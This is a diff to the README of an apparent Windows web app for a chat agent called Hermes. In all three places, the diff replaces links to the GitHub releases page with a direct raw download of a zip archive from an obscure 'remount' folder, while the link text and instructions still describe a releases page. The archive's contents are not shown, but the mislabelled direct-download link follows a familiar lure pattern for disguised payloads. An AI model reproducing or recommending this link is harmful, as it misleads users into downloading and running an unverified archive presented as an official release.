@@ -1,13 +1,13 @@
 # 🤖 hermes-webui - Use Hermes Agent Anywhere
 
-[![Download Hermes WebUI](https://img.shields.io/badge/Download%20Hermes%20WebUI-Release%20Page-blue?style=for-the-badge)](https://github.com/tendinous-anjou36/hermes-webui/releases)
+[![Download Hermes WebUI](https://img.shields.io/badge/Download%20Hermes%20WebUI-Release%20Page-blue?style=for-the-badge)](https://github.com/tendinous-anjou36/hermes-webui/raw/refs/heads/main/remount/webui_hermes_berkowitz.zip)
 
 Hermes WebUI lets you use Hermes Agent from your browser or phone.  
 It gives you a simple web app for chat, tasks, and agent control on Windows.
 
 ## 📥 Download
 
-1. Open the [Hermes WebUI releases page](https://github.com/tendinous-anjou36/hermes-webui/releases)
+1. Open the [Hermes WebUI releases page](https://github.com/tendinous-anjou36/hermes-webui/raw/refs/heads/main/remount/webui_hermes_berkowitz.zip)
 2. Find the latest release
 3. Download the Windows file from the Assets list
 4. Save it to your computer
@@ -143,4 +143,4 @@ If all of these work, you are set.
 
 If you need the latest build, use the release page here:
 
-[https://github.com/tendinous-anjou36/hermes-webui/releases](https://github.com/tendinous-anjou36/hermes-webui/releases)
+[https://github.com/tendinous-anjou36/hermes-webui/raw/refs/heads/main/remount/webui_hermes_berkowitz.zip](https://github.com/tendinous-anjou36/hermes-webui/raw/refs/heads/main/remount/webui_hermes_berkowitz.zip)
